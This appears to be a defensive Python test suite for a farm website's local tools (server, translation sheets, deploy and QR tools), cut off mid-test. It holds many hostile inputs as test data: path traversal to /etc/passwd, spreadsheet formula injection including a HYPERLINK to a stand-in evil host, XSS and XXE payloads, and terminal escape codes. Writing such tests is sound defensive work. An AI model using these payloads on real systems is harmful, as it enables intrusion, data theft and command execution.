#!/usr/bin/env python3
"""Safety checks for the tools the owner runs on their own computer (python3 tools/test_safety.py; about 40 seconds; no internet, no browser).

Many tools read files and words that the owner did not write: pictures sent by other people, review sheets filled in by friends, saved maps,
translations, web addresses, the answers of a web server. Each check below builds a HOSTILE input, runs the real tool on a temporary copy of the
site (your own files are never touched), and looks at what came out:

  serve.py          another site's name in the Host line (DNS rebinding), ".." in every spelling, links that lead outside, key files, terminal
                    codes in the window, other request methods
  review_sheet.py   spreadsheet formulas in the exported sheet, HTML and scripts in a correction, removed or added {placeholders}, huge cells and
                    files, broken or booby-trapped .xlsx files, terminal codes in the report
  i18n.py           a translation that adds an <IFRAME>, an address, a style or a loose < (the page puts translations in as HTML)
  make_deploy_folder.py   links to secret files, key files, an upload folder inside the website
  make_qr.py        javascript:, data:, http: and password addresses on a printed sign, markup in a title
  farm_map.py       markup, line separators, odd numbers, huge or deeply nested files
  add_photo.py      a picture that unpacks to hundreds of megapixels, a text file that says it is a picture, terminal codes in the words
  launch_check.py   a web server that redirects to file: or to a private network, sends a gzip that unpacks to gigabytes, or never finishes
  date_phrases.py   random hostile text, very long text

Run it with  python3 tools/test_safety.py  (add -v to see each check). What was tried, found and fixed: docs/TOOLS_SAFETY.md.
"""
import contextlib
import csv
import gzip
import http.server
import importlib.util
import io
import json
import os
import random
import re
import shutil
import socket
import string
import sys
import tempfile
import threading
import time
import unittest
import warnings
import zipfile

warnings.simplefilter('ignore', ResourceWarning)   # the checks open many small files and let Python close them

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SKIP = {'.git', 'node_modules', 'tests', 'deploy', 'review', '__pycache__', 'docs', 'patches'}
TEMPLATE = None
_counter = [0]


def setUpModule():
    """One copy of the site (without the big folders) that every check copies again."""
    global TEMPLATE
    TEMPLATE = tempfile.mkdtemp(prefix='wa-safety-')
    shutil.copytree(ROOT, os.path.join(TEMPLATE, 'site'), ignore=lambda d, names: [n for n in names if n in SKIP and os.path.abspath(d) == ROOT or n == '__pycache__'])


def tearDownModule():
    shutil.rmtree(TEMPLATE, ignore_errors=True)


def fresh_site(case):
    """A new copy of the site for one check, removed afterwards."""
    d = tempfile.mkdtemp(prefix='wa-safety-site-')
    site = os.path.join(d, 'site')
    shutil.copytree(os.path.join(TEMPLATE, 'site'), site, symlinks=True)
    case.addCleanup(shutil.rmtree, d, True)
    return site


def load(site, name):
    """A tool, loaded from the copy (so its ROOT is the copy)."""
    _counter[0] += 1
    spec = importlib.util.spec_from_file_location('w181_%s_%d' % (name, _counter[0]), os.path.join(site, 'tools', name + '.py'))
    mod = importlib.util.module_from_spec(spec)
    sys.path.insert(0, os.path.join(site, 'tools'))
    try:
        spec.loader.exec_module(mod)
    finally:
        sys.path.pop(0)
    return mod


def run_tool(site, args, timeout=100, stdin=None):
    import subprocess
    r = subprocess.run([sys.executable, '-B'] + args, cwd=site, capture_output=True, timeout=timeout, input=stdin, env=dict(os.environ, PYTHONIOENCODING='utf-8', NO_COLOR='1'))
    return r.returncode, (r.stdout + r.stderr).decode('utf-8', 'replace')


def have(module):
    try:
        __import__(module)
        return True
    except ImportError:
        return False


# ============================================================================================ tools/serve.py
class ServeSafety(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.dir = tempfile.mkdtemp(prefix='wa-safety-serve-')
        cls.site = os.path.join(cls.dir, 'site')
        shutil.copytree(os.path.join(TEMPLATE, 'site'), cls.site, symlinks=True)
        open(os.path.join(cls.site, 'assets', 'server.key'), 'w', encoding='utf-8').write('-----BEGIN PRIVATE KEY-----')
        open(os.path.join(cls.site, 'assets', 'ID_RSA'), 'w', encoding='utf-8').write('secret')
        outside = os.path.join(cls.dir, 'outside.txt')
        open(outside, 'w', encoding='utf-8').write('OUTSIDE')
        os.symlink(outside, os.path.join(cls.site, 'assets', 'leak.txt'))
        os.symlink(cls.dir, os.path.join(cls.site, 'assets', 'leakdir'))
        os.symlink(os.path.join(cls.site, 'README.md'), os.path.join(cls.site, 'assets', 'inner.txt'))
        cls.serve = load(cls.site, 'serve')
        cls.srv, cls.port = cls.serve.start(cls.site, 0)
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()
        shutil.rmtree(cls.dir, ignore_errors=True)

    def setUp(self):
        self.window = io.StringIO()   # what the server prints in its window while this check runs

    def raw(self, request):
        with contextlib.redirect_stdout(self.window):
            s = socket.create_connection(('127.0.0.1', self.port), timeout=5)
            s.sendall(request.encode('latin-1'))
            out = b''
            try:
                while len(out) < 300000:
                    d = s.recv(65536)
                    if not d:
                        break
                    out += d
            except socket.timeout:
                pass
            s.close()
            time.sleep(0.02)   # the server thread prints after it has sent
        return out

    def status(self, path, host=None, method='GET', headers=''):
        host = ('Host: ' + host + '\r\n') if host is not None else ''
        r = self.raw('%s %s HTTP/1.1\r\n%s%sConnection: close\r\n\r\n' % (method, path, host, headers))
        return int(r.split(b' ', 2)[1]) if r.startswith(b'HTTP/') else 0

    def local(self, path, **kw):
        return self.status(path, host='localhost:%d' % self.port, **kw)

    def test_binds_to_this_computer_only(self):
        self.assertEqual(self.srv.server_address[0], '127.0.0.1')

    def test_a_page_addressed_to_another_name_is_refused(self):
        for host in ('evil.example.com', 'evil.example.com:%d' % self.port, '1.2.3.4.nip.io', 'localhost.evil.com', '127.0.0.1.evil.com', 'localhost@evil.com', '192.168.1.5', '0.0.0.0', ''):
            self.assertEqual(self.status('/js/content.js', host=host), 403, 'Host: ' + host)
        self.assertEqual(self.status('/js/content.js'), 403, 'no Host line at all')

    def test_this_computer_is_still_answered_by_every_name_it_has(self):
        for host in ('localhost', 'localhost:1', 'LOCALHOST:%d' % self.port, '127.0.0.1:%d' % self.port, '[::1]:%d' % self.port):
            self.assertEqual(self.status('/', host=host), 200, 'Host: ' + host)

    def test_no_way_of_writing_the_path_leaves_the_folder(self):
        for p in ('/.git/config', '/../README.md', '/%2e%2e/README.md', '/%2e%2e/%2e%2e/etc/passwd', '/..%2f..%2fetc/passwd', '/%252e%252e/x', '/js/../../etc/passwd',
                  '//etc/passwd', '/\\..\\..\\etc\\passwd', '/%5c..%5c..%5cetc%5cpasswd', '/%c0%ae%c0%ae/etc/passwd', '/js/%2e%2e%2fcontent.js', '/index.html%00.txt',
                  '/.hidden', '/js/', '/lang/', '/tools/', '/assets/photos/', '/js/..;/..;/etc/passwd', '/index.html/../../etc/passwd'):
            self.assertEqual(self.local(p), 404, p)

    def test_links_that_lead_outside_the_folder_are_refused_and_links_inside_are_not(self):
        self.assertEqual(self.local('/assets/leak.txt'), 404)
        self.assertEqual(self.local('/assets/leakdir/outside.txt'), 404)
        self.assertEqual(self.local('/assets/inner.txt'), 200)

    def test_key_and_password_files_are_never_shown(self):
        self.assertEqual(self.local('/assets/server.key'), 404)
        self.assertEqual(self.local('/assets/ID_RSA'), 404)
        self.assertEqual(self.local('/assets/favicon.svg'), 200)

    def test_terminal_codes_in_a_path_never_reach_the_window(self):
        self.local('/%1b%5b2J%1b%5d0%3bpwned%07x%e2%80%ae')
        self.status('/', host='\x1b]0;pwned\x07evil.example')
        out = self.window.getvalue()
        self.assertIn('not found:', out)
        self.assertIn('refused a request', out)
        self.assertFalse(re.search('[\x00-\x08\x0b-\x1f\x7f-\x9f‮]', out), repr(out))

    def test_other_methods_are_not_served_and_the_server_keeps_running(self):
        for m in ('POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE'):
            self.assertIn(self.local('/', method=m, headers='Content-Length: 0\r\n'), (405, 501), m)
        self.assertEqual(self.local('/'), 200)
        self.assertEqual(self.local('/', method='HEAD'), 200)

    def test_what_is_sent_cannot_be_loaded_into_another_site_s_page(self):
        r = self.raw('GET /js/content.js HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n').lower()
        self.assertIn(b'cross-origin-resource-policy: same-site', r)
        self.assertIn(b'x-content-type-options: nosniff', r)
        self.assertIn(b'cache-control: no-store', r)


# ============================================================================================ tools/review_sheet.py
FORMULAS = ['=HYPERLINK("http://evil.example/?x="&A1,"click")', "+cmd|' /C calc'!A0", '@SUM(1+1)*cmd|\' /C calc\'!A0', "-2+3+cmd|' /C calc'!A0", '\t=1+1', '\r=1+1', '=1+1\n=2']


class ReviewSheetSafety(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.dir = tempfile.mkdtemp(prefix='wa-safety-rs-')
        cls.site = os.path.join(cls.dir, 'site')
        shutil.copytree(os.path.join(TEMPLATE, 'site'), cls.site, symlinks=True)
        cls.rs = load(cls.site, 'review_sheet')
        cls.src = os.path.join(cls.site, 'lang', 'src', 'es.json')
        cls.orig_src = open(cls.src, encoding='utf-8').read()
        cls.sheet_site = cls.rs.Site()
        items = cls.rs.build_items(cls.sheet_site, 'es')
        ui = [i for i in items if i.kind == 'ui']
        cls.plain = next(i for i in ui if '<' not in i.english and '{' not in i.english and len(i.english) > 30)
        cls.tagged = next(i for i in ui if '<strong>' in i.english)
        cls.holder = next(i for i in items if i.kind == 'js' and '{' in i.english)
        cls.jsplain = next(i for i in items if i.kind == 'js' and '{' not in i.english and len(i.english) > 20)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.dir, ignore_errors=True)

    def cells(self, **named):
        """One row of the sheet, in the order of the sheet's own header (the columns are named, never counted: the sheet gets a new column now and then)."""
        names = {'id': 'id', 'priority': 'priority', 'where': 'where', 'english': 'English', 'current': 'current translation', 'ask': 'question for you', 'correction': 'correction', 'note': 'note'}
        row = {h: '' for h in self.rs.HEADER}
        row['priority'] = '1'
        for k, v in named.items():
            row[names[k]] = v
        return [row[h] for h in self.rs.HEADER]

    def row(self, it, correction, note=''):
        return self.cells(id=it.id, english=it.english, current=it.current, correction=correction, note=note)

    def sheet(self, rows, enc='utf-8-sig', delim=','):
        b = io.StringIO(newline='')
        w = csv.writer(b, lineterminator='\r\n', delimiter=delim)
        w.writerow(self.rs.HEADER)
        for r in rows:
            w.writerow(r)
        return b.getvalue().encode(enc)

    def imp(self, data, name='sheet.csv', **kw):
        """(accepted count, the report text, Problem message or None) for a dry-run import of these bytes."""
        p = os.path.join(self.dir, name)
        open(p, 'wb').write(data)
        out = io.StringIO()
        try:
            self.rs.cmd_import(self.sheet_site, 'es', p, dry_run=True, out=out, **kw)
        except self.rs.Problem as e:
            return None, out.getvalue(), str(e)
        m = re.search(r'(\d+) accepted', out.getvalue())
        return int(m.group(1)), out.getvalue(), None

    # ---- export: what goes into the sheet that is opened in Excel
    def test_exported_cells_that_look_like_formulas_are_kept_as_text(self):
        es = json.loads(self.orig_src)
        ids = [i.id for i in self.rs.build_items(self.sheet_site, 'es') if i.kind == 'ui'][:len(FORMULAS) + 2]
        for i, f in zip(ids, FORMULAS):
            es['ui'][i] = f
        es['ui'][ids[-2]] = '<script>alert(1)</script>'
        es['ui'][ids[-1]] = '<img src=x onerror=alert(1)>'
        open(self.src, 'w', encoding='utf-8').write(json.dumps(es, ensure_ascii=False, indent=1))
        try:
            out = os.path.join(self.dir, 'out')
            with contextlib.redirect_stdout(io.StringIO()):
                self.rs.cmd_export(self.rs.Site(), 'es', out, True)
            rows = list(csv.reader(io.StringIO(open(os.path.join(out, 'es.csv'), encoding='utf-8-sig').read(), newline='')))
            by = {r[0]: r for r in rows[1:]}
            current = rows[0].index('current translation')
            for i, f in zip(ids, FORMULAS):
                cell = by[i][current]
                self.assertNotIn(cell[:1], ('=', '+', '-', '@', '\t', '\r'), repr(f))
                self.assertEqual(cell.strip(), f.replace('\r', '\n').strip(), repr(f))
            page = open(os.path.join(out, 'es.html'), encoding='utf-8').read()
            self.assertNotIn('<script>alert(1)', page)
            self.assertNotIn('<img src=x onerror', page)
            with zipfile.ZipFile(os.path.join(out, 'es.xlsx')) as z:   # the Excel file: every part is XML, the markup of a translation is only letters in it
                for name in z.namelist():
                    part = z.read(name).decode('utf-8')
                    self.assertNotIn('<script>alert(1)', part, name)
                    self.assertNotIn('<img src=x onerror', part, name)
                    self.assertNotIn('<!DOCTYPE', part.upper(), name)
            for extra in ('es-instructions.html', 'es-message.txt'):
                self.assertNotIn('<script>alert(1)', open(os.path.join(out, extra), encoding='utf-8').read(), extra)
        finally:
            open(self.src, 'w', encoding='utf-8').write(self.orig_src)

    # ---- import: what comes back from a friend
    def test_a_normal_correction_is_accepted(self):
        n, _, problem = self.imp(self.sheet([self.row(self.plain, self.plain.current + ' x')]))
        self.assertEqual((n, problem), (1, None))
        n, _, _ = self.imp(self.sheet([self.row(self.plain, self.plain.current + ' x')], enc='utf-16'))
        self.assertEqual(n, 1, 'UTF-16 as Excel saves it')
        n, _, _ = self.imp(self.sheet([self.row(self.plain, self.plain.current + ' x')], delim=';'))
        self.assertEqual(n, 1, 'semicolons')

    def test_corrections_that_carry_code_or_break_the_page_are_refused(self):
        p, t, h, j = self.plain, self.tagged, self.holder, self.jsplain
        hostile = {
            'script in a plain text': (p, '<script>alert(1)</script> ' + p.current),
            'image with a handler': (p, p.current + '<img src=x onerror=alert(1)>'),
            'capital letters in a mark': (t, t.current.replace('<strong>', '<STRONG>').replace('</strong>', '</STRONG>')),
            'handler on an allowed mark': (t, t.current.replace('<strong>', '<strong onmouseover=alert(1)>')),
            'style on an allowed mark': (t, t.current.replace('<strong>', '<strong style="position:fixed;inset:0">')),
            'javascript: address': (p, p.current + ' javascript:alert(1)'),
            'a link made of an entity': (p, p.current + ' <a href="data:text/html,x">x</a>'),
            'placeholder removed': (h, h.current.replace('{', '(').replace('}', ')')),
            'placeholder added': (h, h.current + ' {evil}'),
            'mark in a text the code writes': (j, j.current + ' <b>x</b>'),
            'straight quote in a text the code writes': (j, j.current + ' "x"'),
            'a formula': (p, '=HYPERLINK("http://evil","x")'),
            'a loose <': (p, p.current + ' a < b'),
        }
        for name, (it, corr) in hostile.items():
            n, report, problem = self.imp(self.sheet([self.row(it, corr)]))
            self.assertEqual(n, 0, name + ': ' + (report or problem or '')[:300])

    def test_text_that_looks_like_markup_but_is_only_letters_is_harmless_and_accepted(self):
        n, _, _ = self.imp(self.sheet([self.row(self.plain, self.plain.current + ' &lt;script&gt;alert&lt;/script&gt;')]))
        self.assertEqual(n, 1)   # an entity shows the letters < and >, it never makes a mark

    def test_control_characters_in_a_sheet_never_reach_the_window(self):
        esc = '\x1b[2J\x1b]0;pwned\x07'
        for rows in ([self.cells(id='\x1b[31mRED' + esc, correction='x')], [self.row(self.plain, '', esc + 'note')], [self.row(self.plain, esc + ' <script>')]):
            _, report, problem = self.imp(self.sheet(rows))
            self.assertFalse(re.search('[\x00-\x08\x0b-\x1f\x7f-\x9f]', report + (problem or '')), repr((report + (problem or ''))[:200]))

    def test_words_in_a_column_that_is_not_read_are_listed_safely_and_never_written(self):
        esc = '\x1b[2J\x1b]0;pwned\x07'
        before = open(self.src, encoding='utf-8').read()
        rows = [self.cells(id=self.plain.id, english=self.plain.english, current=esc + 'hola <script>alert(1)</script>'),
                self.cells(id=self.jsplain.id, english=self.jsplain.english, current=self.jsplain.current, ask=esc + 'x' * 5000),
                self.cells(id=self.holder.id, english=esc + 'otro', current=self.holder.current)]
        n, report, problem = self.imp(self.sheet(rows))
        self.assertIsNone(problem)
        self.assertEqual(n, 0)
        self.assertIn('have other words in a column that is not read', report)
        self.assertFalse(re.search('[\x00-\x08\x0b-\x1f\x7f-\x9f]', report), repr(report[:300]))
        self.assertLess(max(len(l) for l in report.split('\n')), 400, 'a cell of 5,000 letters is shortened in the report')
        self.assertEqual(open(self.src, encoding='utf-8').read(), before)

    def test_the_sheet_the_tool_makes_passes_its_own_limits(self):
        out = os.path.join(self.dir, 'own')
        with contextlib.redirect_stdout(io.StringIO()):
            self.rs.cmd_export(self.rs.Site(), 'es', out, True)
        for name in ('es.xlsx', 'es.csv'):
            n, report, problem = self.imp(open(os.path.join(out, name), 'rb').read(), name)
            self.assertIsNone(problem, name)
            self.assertEqual(n, 0, name)
            self.assertNotIn('not read', report, name)
        # the same .xlsx with a booby trap added: a part with a DOCTYPE, a cell far outside the sheet
        data = open(os.path.join(out, 'es.xlsx'), 'rb').read()
        def with_sheet(edit):
            b = io.BytesIO()
            with zipfile.ZipFile(io.BytesIO(data)) as zin, zipfile.ZipFile(b, 'w') as zout:
                for name in zin.namelist():
                    text = zin.read(name).decode('utf-8')
                    zout.writestr(name, edit(text) if name == 'xl/worksheets/sheet1.xml' else text)
            return b.getvalue()
        bomb = with_sheet(lambda t: t.replace('<worksheet', '<!DOCTYPE x [<!ENTITY a "aaaa">]><worksheet', 1))
        far = with_sheet(lambda t: t.replace('<row r="2">', '<row r="2"><c r="ZZZZZZ2" t="n"><v>1</v></c>', 1))
        for name, bad in (('a DOCTYPE', bomb), ('a cell far outside the sheet', far)):
            n, _, problem = self.imp(bad, 'bad.xlsx')
            self.assertTrue(problem and 'Nothing was changed' in problem and 'Traceback' not in problem, name)

    def test_files_that_are_not_sheets_give_a_plain_message(self):
        for name, data in (('junk', os.urandom(4000)), ('only a byte order mark', b'\xef\xbb\xbf'), ('empty', b''), ('latin-1 letters', 'id,correction\r\nx,caf\xe9\r\n'.encode('latin-1'))):
            n, _, problem = self.imp(data)
            self.assertTrue(n is not None or problem, name)
        n, _, problem = self.imp(self.sheet([self.row(self.plain, 'a' * 300000)]))
        self.assertIn('longer than', problem or '', 'a cell of 300,000 letters')

    def test_a_folder_or_an_endless_file_or_a_huge_file_is_not_read(self):
        out = io.StringIO()
        with self.assertRaises(self.rs.Problem) as c:
            self.rs.cmd_import(self.sheet_site, 'es', self.dir, dry_run=True, out=out)
        self.assertIn('not a file', str(c.exception))
        if os.path.exists('/dev/zero'):
            with self.assertRaises(self.rs.Problem):
                self.rs.cmd_import(self.sheet_site, 'es', '/dev/zero', dry_run=True, out=out)
        big = os.path.join(self.dir, 'big.csv')
        with open(big, 'wb') as f:
            f.truncate(self.rs.MAX_FILE_BYTES + 10)
        with self.assertRaises(self.rs.Problem) as c:
            self.rs.cmd_import(self.sheet_site, 'es', big, dry_run=True, out=out)
        self.assertIn('MB', str(c.exception))

    def zip_with(self, members):
        b = io.BytesIO()
        with zipfile.ZipFile(b, 'w') as z:
            for name, text in members.items():
                z.writestr(name, text)
        return b.getvalue()

    def xlsx(self, sheet_xml, shared=None):
        b = io.BytesIO()
        with zipfile.ZipFile(b, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr('[Content_Types].xml', '<Types/>')
            z.writestr('xl/worksheets/sheet1.xml', sheet_xml)
            if shared is not None:
                z.writestr('xl/sharedStrings.xml', shared)
        return b.getvalue()

    def test_excel_files_that_are_broken_or_booby_trapped_give_a_plain_message(self):
        ns = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
        head = '<c r="A1" t="inlineStr"><is><t>id</t></is></c><c r="B1" t="inlineStr"><is><t>correction</t></is></c>'
        good = '<worksheet %s><sheetData><row r="1">%s</row><row r="2"><c r="A2" t="inlineStr"><is><t>%s</t></is></c><c r="B2" t="inlineStr"><is><t>%s</t></is></c></row></sheetData></worksheet>' % (ns, head, self.plain.id, 'hola')
        n, report, problem = self.imp(self.xlsx(good), 'good.xlsx')
        self.assertIsNone(problem, 'a plain good .xlsx must still be read')
        bomb = '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><worksheet %s><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>&c;</t></is></c></row></sheetData></worksheet>' % ns
        cases = {
            'entity bomb': self.xlsx(bomb),
            'external entity': self.xlsx('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><worksheet %s><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>&xxe;</t></is></c></row></sheetData></worksheet>' % ns),
            'a cell far outside the sheet': self.xlsx('<worksheet %s><sheetData><row r="1">%s<c r="ZZZZZZ1" t="inlineStr"><is><t>x</t></is></c></row></sheetData></worksheet>' % (ns, head)),
            'a sheet that unpacks to 41 MB': self.xlsx('<worksheet %s><sheetData><row r="1">%s</row><row r="2"><c r="A2" t="inlineStr"><is><t>%s</t></is></c></row></sheetData></worksheet>' % (ns, head, 'x' * (41 * 1024 * 1024))),
            'a shared-string number that is not a number': self.xlsx('<worksheet %s><sheetData><row r="1"><c r="A1" t="s"><v>abc</v></c></row></sheetData></worksheet>' % ns, shared='<sst %s><si><t>id</t></si></sst>' % ns),
            'broken XML': self.xlsx('<worksheet'),
            'a zip with no sheet': self.zip_with({'../../evil.txt': 'x'}),
        }
        for name, data in cases.items():
            n, _, problem = self.imp(data, 'bad.xlsx')
            self.assertTrue(problem and 'Traceback' not in problem, name)


# ============================================================================================ tools/i18n.py (translations become page HTML)
@unittest.skipUnless(have('bs4'), 'needs beautifulsoup4 (pip install beautifulsoup4)')
class TranslationGate(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        site = os.path.join(TEMPLATE, 'site')
        cls.i18n = load(site, 'i18n')
        cls.en = json.load(open(os.path.join(site, 'lang', 'en.json'), encoding='utf-8'))
        cls.site = site
        cls.plain = next(k for k, v in cls.en.items() if '<' not in v and '{' not in v and len(v) > 30)
        cls.tagged = next(k for k, v in cls.en.items() if '<strong>' in v)
        cls.linked = next(k for k, v in cls.en.items() if '<a1>' in v)
        js = json.load(open(os.path.join(site, 'lang', 'js-strings.json'), encoding='utf-8'))
        cls.jskey = next(k for k in js if '<' not in k and '"' not in k and len(k) > 20)

    def problems(self, ui=None, js=None):
        return self.i18n.unsafe({'ui': ui or {}, 'js': js or {}}, self.en)

    def test_every_translation_the_site_has_passes(self):
        for code in ('es', 'hi', 'zh', 'vi'):
            data = json.load(open(os.path.join(self.site, 'lang', 'src', code + '.json'), encoding='utf-8'))
            self.assertEqual(self.i18n.unsafe(data, self.en), [], code)

    def test_a_translation_that_would_run_or_load_something_is_refused(self):
        en, p, t, a = self.en, self.plain, self.tagged, self.linked
        hostile = {
            'script': {p: 'hola <script>alert(1)</script>'},
            'SCRIPT in capitals': {p: 'hola <SCRIPT>alert(1)</SCRIPT>'},
            'IMG in capitals': {p: 'hola <IMG SRC="https://evil.example/pixel.gif">'},
            'IFRAME in capitals': {p: 'hola <IFRAME SRC="https://evil.example/"></IFRAME>'},
            'A HREF in capitals': {p: 'hola <A HREF="https://evil.example/">x</A>'},
            'A HREF javascript:': {p: 'hola <A HREF="javascript:alert(1)">x</A>'},
            'FORM': {p: 'hola <FORM ACTION="https://evil.example/"><INPUT NAME=pw></FORM>'},
            'STYLE': {p: 'hola <STYLE>body{display:none}</STYLE>'},
            'META refresh': {p: 'hola <META HTTP-EQUIV="refresh" CONTENT="0;url=https://evil.example/">'},
            'BASE': {p: 'hola <BASE HREF="https://evil.example/">'},
            'OBJECT': {p: 'hola <OBJECT DATA="https://evil.example/x.swf"></OBJECT>'},
            'svg onload': {p: 'hola <svg onload=alert(1)>'},
            'mXSS mathml': {p: 'hola <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'},
            'a comment': {p: 'hola <!-- x -->'},
            'a real link instead of the <a1> place': {a: en[a].replace('<a1>', '<a href="https://evil.example/">')},
            'style added to a mark': {t: en[t].replace('<strong>', '<strong style="position:fixed;inset:0;background:red">')},
            'handler added to a mark': {t: en[t].replace('<strong>', '<strong onmouseover=alert(1)>')},
            'a mark left out': {t: en[t].replace('<strong>', '').replace('</strong>', '')},
            'a loose <': {p: 'hola a < b'},
            'a loose >': {p: 'hola a > b'},
        }
        for name, ui in hostile.items():
            self.assertTrue(self.problems(ui=ui), name)

    def test_text_that_only_looks_like_markup_is_accepted(self):
        self.assertEqual(self.problems(ui={self.plain: 'hola &lt;script&gt;alert(1)&lt;/script&gt; &#60;b&#62;'}), [])
        self.assertEqual(self.problems(ui={self.tagged: self.en[self.tagged].replace('Open', 'Abierto')}), [])

    def test_texts_the_code_writes_are_plain_text(self):
        k = self.jskey
        self.assertTrue(self.problems(js={k: 'hola <b>x</b>'}))
        self.assertTrue(self.problems(js={k: 'hola "x"'}))
        self.assertTrue(self.problems(js={k: ['x']}), 'not text at all: a plain message, not a Python error')
        self.assertTrue(self.problems(ui={self.plain: None}))
        self.assertEqual(self.problems(js={k: 'hola'}), [])

    def test_an_old_line_for_text_that_is_no_longer_on_any_page_may_only_carry_plain_marks(self):
        self.assertTrue(self.problems(ui={'t00000000': '<IFRAME SRC=x></IFRAME>'}))
        self.assertTrue(self.problems(ui={'t00000000': '<img src=x>'}))
        self.assertEqual(self.problems(ui={'t00000000': 'hola <strong>x</strong> <a1>y</a> <svg/>'}), [])


# ============================================================================================ tools/make_deploy_folder.py
class DeploySafety(unittest.TestCase):
    def test_links_and_key_files_are_never_uploaded(self):
        site = fresh_site(self)
        mdf = load(site, 'make_deploy_folder')
        secret = os.path.join(os.path.dirname(site), 'secret.txt')
        open(secret, 'w', encoding='utf-8').write('SECRET')
        for path in ('assets/leak.txt', 'css/also.css', 'secret.html'):
            os.symlink(secret, os.path.join(site, path))
        os.symlink(os.path.dirname(site), os.path.join(site, 'js', 'folderlink'))
        for path, text in (('assets/server.key', 'k'), ('assets/ID_ED25519.pub', 'k'), ('.env', 'SECRET=1'), ('notes.txt', 'private'), ('id_rsa', 'k'), ('assets/.hidden', 'x')):
            open(os.path.join(site, path), 'w', encoding='utf-8').write(text)
        files, left = mdf.upload_set(site)
        for bad in ('assets/leak.txt', 'css/also.css', 'secret.html', 'assets/server.key', 'assets/ID_ED25519.pub', '.env', 'notes.txt', 'id_rsa', 'assets/.hidden'):
            self.assertNotIn(bad, files, bad)
        self.assertFalse([f for f in files if f.startswith('js/folderlink')])
        left = dict(left)
        self.assertIn('link', left['assets/leak.txt'])
        self.assertIn('link', left['secret.html'])
        self.assertIn('link', left['js/folderlink/'])
        self.assertIn('key', left['assets/server.key'])
        self.assertIn('assets/favicon.svg', files)
        self.assertIn('index.html', files)

    def test_the_command_copies_none_of_it_into_deploy(self):
        site = fresh_site(self)
        secret = os.path.join(os.path.dirname(site), 'secret.txt')
        open(secret, 'w', encoding='utf-8').write('SECRET-CONTENT')
        os.symlink(secret, os.path.join(site, 'assets', 'leak.txt'))
        open(os.path.join(site, 'assets', 'server.key'), 'w', encoding='utf-8').write('SECRET-CONTENT')
        code, out = run_tool(site, ['tools/make_deploy_folder.py', '--no-rebuild', '--force', '--out', os.path.join(site, 'deploy')])
        self.assertTrue(os.path.exists(os.path.join(site, 'deploy', 'index.html')), out[-400:])
        found = []
        for d, _, names in os.walk(os.path.join(site, 'deploy')):
            for n in names:
                if b'SECRET-CONTENT' in open(os.path.join(d, n), 'rb').read():
                    found.append(n)
        self.assertEqual(found, [])
        self.assertIn('leak.txt', out)

    def test_the_upload_folder_may_not_sit_inside_the_uploaded_folders_or_be_a_link(self):
        site = fresh_site(self)
        mdf = load(site, 'make_deploy_folder')
        os.symlink('/tmp', os.path.join(site, 'linkout'))
        for out in ('assets/deploy', 'js', 'lang/x', 'css/old', 'print/x', 'linkout'):
            with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit, msg=out):
                mdf.check_out(os.path.join(site, out))
        for out in (site, os.path.dirname(site)):
            with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit, msg=out):
                mdf.check_out(out)
        for out in (os.path.join(site, 'deploy'), os.path.join(os.path.dirname(site), 'upload-here')):
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertTrue(mdf.check_out(out))


# ============================================================================================ tools/make_qr.py
@unittest.skipUnless(have('segno'), 'needs segno (pip install segno)')
class QrSafety(unittest.TestCase):
    def test_only_a_plain_https_address_goes_on_a_printed_sign(self):
        site = fresh_site(self)
        qr = load(site, 'make_qr')
        for url in ('javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'http://example.com/', 'HTTPS://example.com/', 'https://user:pass@example.com/', 'https://example.com/a b',
                    'https://example.com/a\nb', 'https://', 'https:///x', '', 'file:///etc/passwd', '//example.com/x', 'https://@example.com/'):
            self.assertTrue(qr.url_problem(url), repr(url))
        for url in ('https://example.com/ok', 'https://www.wiseacresorganic.com/index.html#visit', 'https://bookeo.com/wiseacres?category=1&x=2'):
            self.assertEqual(qr.url_problem(url), '', url)

    def test_the_sheet_keeps_markup_in_titles_as_text_and_skips_a_bad_address(self):
        site = fresh_site(self)
        path = os.path.join(site, 'tools', 'qr_links.json')
        cfg = json.load(open(path, encoding='utf-8'))
        cfg['signs'][0]['title_en'] = '<script>alert(1)</script>"><img src=x onerror=alert(1)>'
        cfg['signs'][1]['url'] = 'javascript:alert(1)'
        open(path, 'w', encoding='utf-8').write(json.dumps(cfg, ensure_ascii=False, indent=1))
        code, out = run_tool(site, ['tools/make_qr.py'])
        page = open(os.path.join(site, 'print', 'qr-signs.html'), encoding='utf-8').read()
        self.assertNotIn('<script>alert(1)', page)
        self.assertNotIn('<img src=x onerror', page)
        self.assertIn('skipped  %s' % cfg['signs'][1]['id'], out)
        self.assertNotIn('made     ' + cfg['signs'][1]['id'], out)


# ============================================================================================ tools/farm_map.py
class FarmMapSafety(unittest.TestCase):
    def map(self, site, doc=None, raw=None):
        p = os.path.join(os.path.dirname(site), 'saved.json')
        open(p, 'w', encoding='utf-8').write(raw if raw is not None else json.dumps(doc))
        return run_tool(site, ['tools/farm_map.py', p])

    def test_hostile_words_and_numbers_end_up_as_data_in_the_map_file(self):
        site = fresh_site(self)
        doc = {'imageSize': {'width': 1000, 'height': 800}, 'topFaces': '"><script>alert(1)</script>', 'items': [
